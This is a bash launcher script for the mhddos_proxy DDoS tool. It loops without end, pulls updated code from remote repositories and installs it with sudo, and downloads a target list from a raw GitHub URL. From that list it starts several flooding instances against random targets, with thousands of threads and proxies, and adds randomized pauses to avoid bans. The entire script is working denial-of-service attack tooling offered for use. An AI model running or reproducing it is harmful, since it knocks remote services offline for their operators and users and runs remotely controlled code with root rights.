#!/bin/bash


restart_interval="10m"

ulimit -n 1048576
# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
#cd ~/mhddos_proxy
#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
#sudo pip3 install -r requirements.txt

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
sudo pkill -e -f runner.py
sudo pkill -e -f ./start.py
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"

targets="https://raw.githubusercontent.com/girador/res/main/targets.txt"

proxy_interval="1200"
proxy_interval="-p $proxy_interval"

num_of_copies="${1:-1}"
threads="${2:-3000}"
if ((threads < 2000));
then
	threads=2000
fi

rpc="${3:-1000}"
if ((rpc < 1000));
then
	rpc=1000
fi

debug="--debug"
timeout="--proxy-timeout 3"


# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
do	
	cd ~/mhddos_proxy


	num0=$(sudo git pull origin main | grep -c "Already")
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		cd ~/mhddos_proxy
		clear
		sudo pip3 install -r requirements.txt
		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
	fi
	
	
	cd ~/auto
   	num=$(sudo git pull origin main | grep -c "Already")
   	echo "$num"
   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos"
	else
		cd ~/auto
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos"
		bash runner.sh $num_of_copies $threads $rpc& # run new downloaded script 
		#sudo pkill -o -f runner.sh
		return 0
		#exit #terminate old script
	fi
	#
   	
	
   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   	list_size=$(curl -s "$targets" | cat | grep "^[^#]" | wc -l)
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
   	if (("$num_of_copies" == "all"));
	then	
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies > list_size));
	then 
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies < 1));
	then
		num_of_copies=1
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s $targets | cat | grep "^[^#]")")
           

            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            echo "sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug $timeout"
            
            cd ~/mhddos_proxy
            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
            sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug $timeout&
            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   	done
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	sudo pkill -e -f runner.py
   	sudo pkill -e -f ./start.py
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[46mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[42mRESTARTING\033[0m\n"
	
	# for docker
   	#echo "Kill all useless docker-containers with MHDDoS"
   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
   	#echo "Docker useless containers killed"
done
